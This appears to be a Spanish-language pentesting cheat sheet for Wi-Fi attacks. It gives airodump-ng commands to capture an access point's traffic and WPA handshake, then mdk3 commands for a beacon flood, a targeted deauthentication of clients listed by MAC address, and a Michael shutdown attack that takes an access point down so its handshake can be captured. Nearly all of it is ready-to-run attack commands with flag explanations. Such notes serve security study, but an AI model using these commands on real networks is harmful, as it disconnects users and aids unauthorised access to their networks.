# Ataques 

Tags: #Beacon-Food #Attack #WPA/WPA2 

## Ataque Beacon Flood

```bash 
1. Para iniciar el ataque debemos de capturar el trafico del AP y mantenerlo asi hasta tener el 'Handshake' del cliente

❯ airodump-ng -c 1 --bssid <MAC> <wlan0mon> -w Captura # Guardaremos la captura de datos en varios archivos, pero el que nos interesa (.cap), la passwd esta cifrada
```

```bash 
2. Los paquetes 'beacon' son emitidos por los AP para que los usuarios sean capaces de identificarlos 

3. Este tipo de ataques de hace emitiendo mucho paquetes beacon con informacion falsa anunciando una red y un canal especifico, este ataque se hace con el fin de 'dañar' el espectro de onda de la red y hacer que los dispositivos se desconecten del AP. 

❯ mdk3 <wlan0mon> b -f file.txt -a -s 1000 -c 1 
	# b = Modo beacon attack 
	# f = File a usar (Este archivo contiene los nombres a usar en el ataque) 
	# c = Canal 
```

## Ataque 'Disassociation Amok mode' (Deautenticación dirigido)

```bash 
1. Para iniciar el ataque debemos de capturar el trafico del AP y mantenerlo asi hasta tener el 'Handshake' del cliente

❯ airodump-ng -c 1 --bssid <MAC> <wlan0mon>           # Capturar la red para descubir el AP y su canal 
```

```bash 
2. Con este ataque podemos crear un archivo 'Whitelist o Blaclist' con las MACs de los clientes para deautenticarlos
 
❯ mdk3 <wlan0mon> d -w blacklist -c 1 
	# d = Deautenticacion Amok mode
	# w = Lista de MAC de los clientes 
	# c = Canal 
```

## Ataque 'Michael Shutdown Explotation'

```bash 
1. Para iniciar el ataque debemos de capturar el trafico del AP y mantenerlo asi hasta tener el 'Handshake' del cliente

❯ airodump-ng -c 1 --bssid <MAC> <wlan0mon> -w Captura # Guardaremos la captura de datos en varios archivos, pero el que nos interesa (.cap), la passwd esta cifrada
```

```bash 
2. Este ataque sirve para apagar un AP y despues de que se reestablezca podriamos capturar el 'Handshake'

❯ mdk3 <wlan0mon> m -t <MAC> 
	# m = Ataque Michael
	# t = MAC del AP 
```